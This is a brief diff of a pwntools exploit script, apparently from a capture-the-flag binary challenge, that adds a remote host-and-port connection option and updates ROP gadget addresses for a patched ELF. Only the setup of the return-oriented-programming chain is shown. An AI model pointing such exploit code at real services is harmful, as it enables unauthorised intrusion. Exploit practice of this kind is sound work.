@@ -1,14 +1,18 @@
 from pwn import *
 
-context.terminal = ["konsole", "-e"]
 context.binary = binary = elf = ELF("./program.elf_patched")
 
-p = process()
+if len(sys.argv) > 1:
+    p = remote(sys.argv[1], int(sys.argv[2]))
+
+else:
+    context.terminal = ["konsole", "-e"]
+    p = process()
 
 # gdb.attach(p)
 
-pop_rdi_ret = p64(0x00000000004004b6)
-ret = p64(0x0000000000400356)
+pop_rdi_ret = p64(0x00000000004011da)
+ret = p64(0x000000000040101a)
 
 main_address = p64(binary.symbols.main)
 
